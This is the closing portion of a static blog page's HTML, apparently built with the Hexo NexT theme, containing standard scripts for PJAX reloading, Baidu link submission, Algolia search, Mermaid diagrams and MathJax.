    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
